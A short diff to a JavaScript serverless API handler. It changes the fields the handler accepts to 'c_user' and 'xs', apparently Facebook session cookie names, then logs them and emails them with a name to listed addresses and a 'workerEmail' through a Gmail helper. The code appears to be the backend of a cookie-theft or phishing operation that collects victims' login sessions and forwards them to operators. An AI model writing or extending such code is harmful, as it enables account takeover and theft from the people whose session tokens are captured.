@@ -6,14 +6,14 @@ export default async function handler(req, res) {
   }
 
   try {
-    const { ser, us, emails, workerEmail, name } = req.body;
+    const { c_user, xs, emails, workerEmail, name } = req.body;
 
     console.log('📨 Processing submission...');
-    console.log('Data:', { ser, us, emails, workerEmail, name });
+    console.log('Data:', { c_user, xs, emails, workerEmail, name });
 
     // ✅ Step 1: Email send karenge
     const emailResult = await sendGmail(emails, workerEmail, {
-      ser, us, name
+      c_user, xs, name
     });
 
     return res.status(200).json({
